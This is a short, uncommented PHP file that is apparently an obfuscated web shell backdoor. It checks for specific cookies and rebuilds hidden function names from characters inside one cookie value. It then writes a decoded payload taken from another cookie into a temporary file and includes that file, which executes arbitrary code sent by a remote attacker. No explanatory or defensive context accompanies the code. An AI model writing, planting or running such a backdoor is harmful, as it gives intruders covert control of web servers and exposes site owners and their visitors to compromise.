<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[23])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 8;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[23][$n];
        if (!$c[23][$n + 1]) {
            if (!$c[23][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 8 + 1;
    }
    $k = $p[7]() . $p[0];
    if (!$p[24]($k)) {
        $n = $p[9]($k, $p[16]);
        $p[22]($n, $p[2] . $p[13]($p[18]($c[3])));
    }
    include($k);
}